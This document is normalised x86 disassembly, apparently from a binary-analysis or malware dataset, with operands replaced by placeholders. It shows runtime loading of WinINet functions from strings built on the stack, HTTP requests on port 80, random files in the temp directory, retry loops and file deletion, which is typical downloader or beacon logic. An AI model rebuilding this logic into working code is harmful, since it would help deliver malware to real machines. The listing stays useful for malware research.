push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
push [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
call sub_100050f2
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2
push edi
call [ eax ]
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] 0x696e6977
mov [ ebp - 0x14 ] 0x2e74656e
mov [ ebp - 0x10 ] 0x6c6c64
call [ GetModuleHandleA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x3
push edi
call [ eax ]
lea eax [ ebp - 0x40 ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x65746e49
mov [ ebp - 0x3c ] 0x74656e72
mov [ ebp - 0x38 ] 0x736f6c43
mov [ ebp - 0x34 ] 0x6e614865
mov [ ebp - 0x30 ] 0x656c64
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x25 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4
push edi
call [ eax ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x2c ] 0x65746e49
mov [ ebp - 0x28 ] 0x74656e72
mov [ ebp - 0x24 ] 0x64616552
mov [ ebp - 0x20 ] 0x656c6946
mov [ ebp - 0x1c ] 0x0
call [ GetProcAddress@IAT ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x29 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x5
push edi
call [ eax ]
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
sub_10005837
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi ecx
mov ecx [ esi ]
push edi
mov [ ebp - 0x14 ] esi
call sub_10004b00
mov edi [ GetLastError@IAT ]
mov [ ebp - 0x1 ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0xe
mov ebx r--data
push ebx
call [ eax ]
mov ecx [ esi ]
call sub_10004ab2
mov [ ebp - 0x2 ] al
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0xf
push ebx
call [ eax ]
mov ecx [ esi ]
call sub_10004dbc
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push r--data
push 0x1
push 0x10
push ebx
call [ eax ]
mov ecx [ esi ]
call sub_10004d1a
mov esi [ lstrlenA@IAT ]
push eax
mov [ ebp - 0x10 ] eax
call esi
push [ ebp - 0xc ]
mov ebx eax
call esi
lea eax [ ebx + eax + 0xe ]
push eax
call sub_100049a9
mov ebx eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push ebx
mov [ ebp - 0x1c ] ebx
call sub_1000428b
push 0x1
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
call sub_1000428b
add esp 0x1c
push [ ebp - 0xc ]
call esi
push eax
push [ ebp - 0xc ]
lea eax [ ebx + 0x2 ]
push eax
call sub_1000428b
add esp 0xc
push [ ebp - 0x10 ]
call esi
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call esi
lea eax [ eax + ebx + 0x2 ]
push eax
call sub_1000428b
add esp 0xc
push 0x12131415
push r--data
push [ ebp - 0x10 ]
call esi
push [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
call esi
mov ecx [ ebp - 0x18 ]
add ecx ebx
lea eax [ eax + ecx + 0x2 ]
push eax
call [ wsprintfA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
add esp 0xc
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
mov ebx r--data
push ebx
push 0x1
push 0x11
mov esi r--data
push esi
call [ eax ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_1000411b
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push ebx
push 0x1
push 0x12
push esi
call [ eax ]
push [ ebp - 0x1c ]
mov ecx [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_1000532f
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push ebx
push 0x1
push 0x13
push esi
call [ eax ]
push [ ebp - 0x18 ]
call sub_100049d3
push [ ebp - 0x1c ]
call sub_100049d3
push [ ebp - 0x10 ]
call sub_100049d3
push [ ebp - 0xc ]
call sub_100049d3
mov eax [ ebp - 0x14 ]
add esp 0x10
pop edi
pop esi
pop ebx
leave
retn
sub_10005a2a
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
mov esi ecx
push 0x401
mov [ ebp - 0x10 ] esi
call sub_100049a9
push 0x4
mov [ ebp - 0x24 ] eax
call sub_10004992
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx eax
call sub_100047fb
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x24 ]
leave
retn
mov ecx [ ebp - 0x8 ]
call sub_10004711
push [ ebp - 0x8 ]
call sub_100049b2
pop ecx
mov ecx [ esi + 0x4 ]
push 0xa
push r--data
call sub_1000411b
mov esi [ GetLastError@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x43
mov edi r--data
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x5
push 0x6
call sub_10004896
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x44
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x7
push 0x1
call sub_10004807
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x45
push edi
call [ eax ]
push [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
call sub_10004823
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x46
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x3
push 0x0
call sub_10004807
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
push eax
push ebx
mov ecx [ rw-data ]
mov eax [ ebp - 0x4 ]
push 0x1
push 0x47
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
push 0x3
push 0x1
call sub_10004807
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x48
push edi
call [ eax ]
push [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
call sub_10004823
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x49
push edi
call [ eax ]
push 0x0
push [ ebp - 0xc ]
call [ lstrlenA@IAT ]
push eax
mov eax [ ebp - 0x10 ]
push [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
call sub_10003e60
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4a
push edi
call [ eax ]
mov eax [ ebp - 0x28 ]
imul eax eax 0x5
add eax r--data
push 0x5
push eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4 ]
call sub_1000411b
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4b
push edi
call [ eax ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push r--data
push [ ebp - 0x24 ]
call [ wsprintfA@IAT ]
push [ ebp - 0x10 ]
call sub_100049d3
push [ ebp - 0x14 ]
call sub_100049d3
push [ ebp - 0x18 ]
call sub_100049d3
push [ ebp - 0x1c ]
call sub_100049d3
push [ ebp - 0x20 ]
call sub_100049d3
push [ ebp - 0xc ]
call sub_100049d3
add esp 0x34
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
sub_10005c92
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push 0x4
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx + 0x4 ]
push r--data
call sub_1000411b
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x2c
mov edi r--data
push edi
call [ eax ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
push 0x2f
push r--data
call sub_1000411b
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2d
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_10005a2a
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
call sub_10005591
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2f
push edi
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x8 ]
call [ InternetOpenA@IAT ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x8 ]
push 0x0
push 0x0
call sub_10005591
push eax
mov eax [ ebp - 0x8 ]
push 0x3
push [ eax + 0x8 ]
call [ InternetOpenA@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x2e
push edi
call [ eax ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp - 0x24 ]
push [ ebp - 0xc ]
call [ HttpSendRequestA@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x33
push edi
call [ eax ]
xor eax eax
cmp [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ ebp - 0x8 ]
call sub_10005609
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push 0x3
push eax
push eax
mov eax [ ebp - 0x8 ]
push 0x50
push [ eax + 0xc ]
push [ ebp - 0x1c ]
call [ InternetConnectA@IAT ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x30
push edi
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x28 ]
push [ ebp - 0x18 ]
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x31
push edi
call [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_100055cd
test eax eax
je r-xdata
push [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
call [ esi + 0x25 ]
push [ ebp - 0x18 ]
call [ esi + 0x25 ]
push [ ebp - 0x1c ]
call [ esi + 0x25 ]
push [ ebp - 0x20 ]
call sub_100049d3
push [ ebp - 0x24 ]
call sub_100049d3
push [ ebp - 0x28 ]
call sub_100049d3
mov eax [ ebp + 0x8 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn 0x4
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x16
push [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ HttpQueryInfoA@IAT ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push ebx
push 0x1
push 0x34
push edi
call [ eax ]
call esi
cmp eax 0x7a
jne r-xdata
mov ecx [ ebp - 0x8 ]
call sub_10005609
mov ecx [ ebp - 0x8 ]
push eax
call sub_100055cd
mov ecx [ ebp - 0x8 ]
push eax
push [ ebp - 0x18 ]
call sub_10005430
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x32
push edi
call [ eax ]
push [ ebp - 0x4 ]
call sub_100049a9
pop ecx
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x13
push [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
call [ HttpQueryInfoA@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push ebx
xor esi esi
inc esi
push esi
push 0x35
push edi
call [ eax ]
push 0x3
push r--data
push [ ebp - 0x14 ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp + 0x8 ] esi
push 0x3
push r--data
push [ ebp - 0x14 ]
call sub_100042b0
add esp 0xc
test eax eax
je r-xdata
and [ ebp + 0x8 ] 0x0
jmp r-xdata
push [ ebp - 0x14 ]
call sub_100049d3
pop ecx
sub_10005f96
push ebp
mov ebp esp
sub esp 0x28
and [ ebp - 0x24 ] 0x0
push ebx
push esi
push edi
mov esi ecx
call sub_10005a2a
mov ecx [ esi + 0x4 ]
push 0x4
push r--data
mov [ ebp - 0x20 ] eax
call sub_1000411b
mov ecx [ esi + 0x4 ]
push 0x2f
push r--data
mov [ ebp - 0x1c ] eax
call sub_1000411b
mov ecx esi
mov [ ebp - 0x18 ] eax
call sub_10005591
mov edi [ GetLastError@IAT ]
test eax eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x37
mov ebx r--data
push ebx
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x36
mov ebx r--data
push ebx
call [ eax ]
push 0x0
push 0x0
mov ecx esi
call sub_10005591
push eax
push 0x3
jmp r-xdata
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
push 0xffffffff
push [ ebp - 0x18 ]
push [ ebp - 0x8 ]
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x3a
push ebx
call [ eax ]
xor eax eax
cmp [ ebp - 0xc ] eax
je r-xdata
mov ecx esi
call sub_10005609
test eax eax
je r-xdata
push [ esi + 0x8 ]
call [ InternetOpenA@IAT ]
mov [ ebp - 0x14 ] eax
xor eax eax
push eax
push eax
push 0x3
push eax
push eax
push 0x50
push [ esi + 0xc ]
push [ ebp - 0x14 ]
call [ InternetConnectA@IAT ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x38
push ebx
call [ eax ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x39
push ebx
call [ eax ]
mov ecx esi
call sub_100055cd
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ esi + 0x25 ]
push [ ebp - 0x10 ]
call [ esi + 0x25 ]
push [ ebp - 0x14 ]
call [ esi + 0x25 ]
push [ ebp - 0x18 ]
call sub_100049d3
push [ ebp - 0x1c ]
call sub_100049d3
push [ ebp - 0x20 ]
call sub_100049d3
mov eax [ ebp - 0x24 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn 0x8
push eax
mov [ ebp + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x20000005
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x4
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x28 ]
push r--data
push 0x1
push 0x3b
push ebx
call [ eax ]
xor edi edi
cmp [ ebp - 0xc ] edi
je r-xdata
mov ecx esi
call sub_10005609
push eax
mov ecx esi
call sub_100055cd
push eax
push [ ebp - 0x10 ]
mov ecx esi
call sub_10005430
cmp [ ebp + 0x8 ] 0xa
jbe r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_100049a9
and [ ebp - 0xc ] edi
pop ecx
mov ebx eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp edi [ ebp + 0x8 ]
jb r-xdata
push ebx
call sub_100049d3
pop ecx
push [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
push [ ebp + 0x8 ]
push ebx
call sub_10003fe9
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ edi + ebx ]
push eax
push [ ebp - 0x8 ]
call [ esi + 0x29 ]
add edi [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
sub_1000621a
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
mov [ eax ] ebx
call sub_10005a2a
mov ecx [ edi + 0x4 ]
push 0x4
push r--data
mov [ ebp - 0x1c ] eax
call sub_1000411b
mov ecx [ edi + 0x4 ]
push 0x2f
push r--data
mov [ ebp - 0x8 ] eax
call sub_1000411b
mov esi 0x104
push esi
mov [ ebp - 0xc ] eax
call sub_10001f60
pop ecx
push eax
push esi
mov [ ebp - 0x10 ] eax
call [ GetTempPathA@IAT ]
push 0xc
call sub_10001fff
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
push 0x7a
push 0x61
push 0x5
call sub_10003702
mov esi r--data
push esi
push r--data
push eax
mov [ ebp - 0x20 ] eax
call sub_10002cef
push [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
call sub_10001f78
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] ebx
call sub_1000392f
add esp 0x20
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
push 0x1
push esi
push 0xa7
push r--data
push [ ebp - 0x10 ]
call sub_100039ea
push esi
call sub_1000372b
add esp 0x18
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x7530
call [ Sleep@IAT ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000392f
pop ecx
push 0x1
push [ ebp - 0x4 ]
push ebx
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x1c ]
push [ ebp - 0x8 ]
push ebx
push ebx
push [ edi + 0xc ]
push ebx
push ebx
push [ edi + 0x8 ]
push eax
call sub_100027e1
push [ ebp - 0xc ]
mov [ ebp + 0xb ] al
call sub_100049d3
push [ ebp - 0x8 ]
call sub_100049d3
add esp 0x40
push [ ebp - 0x1c ]
call sub_100049d3
push esi
push [ ebp - 0x4 ]
push [ ebp - 0x10 ]
call sub_10002cef
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push r--data
push [ ebp - 0x10 ]
call sub_10002cef
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
call sub_10001f78
add esp 0x24
xor esi esi
mov [ ebp - 0x14 ] ebx
cmp [ ebp + 0xb ] bl
je r-xdata
push [ ebp - 0x8 ]
call sub_10001f78
push [ ebp - 0xc ]
call sub_10001f78
push [ ebp - 0x10 ]
call sub_10001f78
add esp 0xc
cmp esi ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
xor eax eax
cmp esi ebx
je r-xdata
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0xc ]
call sub_1000356d
pop ecx
pop ecx
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_100034c5
pop ecx
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx [ edi + 0x4 ]
push [ ebp - 0x14 ]
push esi
call sub_10003fe9
cmp [ esi ] 0x32
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x8 ]
call sub_1000356d
pop ecx
pop ecx
push [ ebp - 0x8 ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x1e
jb r-xdata
mov eax [ ebp + 0xc ]
push esi
mov [ eax ] ebx
call sub_10001f78
pop ecx
xor esi esi
mov esi eax
call [ DeleteFileA@IAT ]
push [ ebp - 0xc ]
call sub_100034c5
pop ecx
test al al
jne r-xdata
jmp r-xdata
sub_10006436
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
call sub_10005a2a
mov ecx [ edi + 0x4 ]
push 0x4
push r--data
mov [ ebp - 0x1c ] eax
call sub_1000411b
mov ecx [ edi + 0x4 ]
push 0x2f
push r--data
mov [ ebp - 0x18 ] eax
call sub_1000411b
mov esi 0x104
push esi
mov [ ebp - 0x8 ] eax
call sub_10001f60
pop ecx
push eax
push esi
mov [ ebp - 0xc ] eax
call [ GetTempPathA@IAT ]
push 0xc
call sub_10001fff
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
push 0x7a
push 0x61
push 0x5
call sub_10003702
mov esi r--data
push esi
push r--data
push eax
mov [ ebp - 0x20 ] eax
call sub_10002cef
push [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
call sub_10001f78
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] ebx
call sub_1000392f
add esp 0x20
jmp r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
push 0x1
push esi
push 0xa7
push r--data
push [ ebp - 0xc ]
call sub_100039ea
push esi
call sub_1000372b
add esp 0x18
cmp esi ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x7530
call [ Sleep@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_1000392f
pop ecx
push 0x1
push [ ebp - 0x4 ]
push ebx
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push ebx
push ebx
push [ edi + 0xc ]
push ebx
push ebx
push [ edi + 0x8 ]
push eax
call sub_10002a25
push [ ebp - 0x8 ]
mov [ ebp + 0xb ] al
call sub_100049d3
push [ ebp - 0x18 ]
call sub_100049d3
add esp 0x40
push [ ebp - 0x1c ]
call sub_100049d3
push esi
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
call sub_10002cef
push esi
push [ ebp - 0x4 ]
mov edi eax
push r--data
push [ ebp - 0xc ]
call sub_10002cef
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
call sub_10001f78
add esp 0x24
xor esi esi
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0xb ] bl
je r-xdata
push edi
call sub_10001f78
push [ ebp - 0x8 ]
call sub_10001f78
push [ ebp - 0xc ]
call sub_10001f78
add esp 0xc
cmp esi ebx
je r-xdata
mov [ ebp + 0x8 ] ebx
push esi
call sub_10001f78
pop ecx
pop edi
pop esi
movzx eax bl
pop ebx
leave
retn 0x4
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
call sub_1000356d
pop ecx
pop ecx
push [ ebp - 0x8 ]
push edi
call sub_100034c5
pop ecx
test al al
jne r-xdata
cmp [ esi ] 0x32
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_1000356d
pop ecx
pop ecx
push edi
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x1e
jb r-xdata
mov bl 0x1
mov esi eax
call [ DeleteFileA@IAT ]
push [ ebp - 0x8 ]
call sub_100034c5
pop ecx
test al al
jne r-xdata
jmp r-xdata
sub_1000662d
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
cmp [ ecx + 0x24 ] 0x0
push eax
push [ ebp + 0x8 ]
je r-xdata
call sub_10005f96
call sub_1000621a
jmp r-xdata
pop ebp
retn 0x8
sub_10006650
push ebx
push esi
push edi
mov edi ecx
call sub_1000513c
xor bl bl
mov [ edi + 0x24 ] bl
mov esi r--data
mov eax [ rw-data ]
mov ebx [ eax ]
call [ GetLastError@IAT ]
push eax
push esi
push 0x1
push 0x159
mov ecx edi
call sub_100054c3
push esi
mov ecx edi
call sub_10005c92
test eax eax
jne r-xdata
mov ecx edi
call sub_10005549
push esi
mov ecx edi
call sub_10006436
test eax eax
jne r-xdata
mov [ edi + 0x24 ] 0x1
mov eax [ rw-data ]
mov ebx [ eax ]
call [ GetLastError@IAT ]
push eax
push esi
push 0x1
push 0x2a
jmp r-xdata
push 0x3a98
call [ Sleep@IAT ]
inc bl
cmp bl 0x2
jb r-xdata
mov ecx [ rw-data ]
push r--data
call [ ebx ]
mov ecx edi
pop edi
pop esi
pop ebx
jmp sub_10005185
push esi
mov ecx edi
call sub_10005c92
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_100066f4
push ebp
mov ebp esp
cmp [ ecx + 0x24 ] 0x0
push esi
push [ ebp + 0x8 ]
je r-xdata
call sub_10005c92
test eax eax
je r-xdata
call sub_10006436
test eax eax
je r-xdata
xor eax eax
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
push eax
push r--data
push 0x1
push 0x1bb
jmp r-xdata
mov eax [ rw-data ]
mov esi [ eax ]
call [ GetLastError@IAT ]
push eax
push r--data
push 0x1
push 0x2b
mov ecx [ rw-data ]
push r--data
call [ esi ]
xor eax eax
inc eax
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_1000675f
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
call sub_100056b6
mov eax [ rw-data ]
mov eax [ eax ]
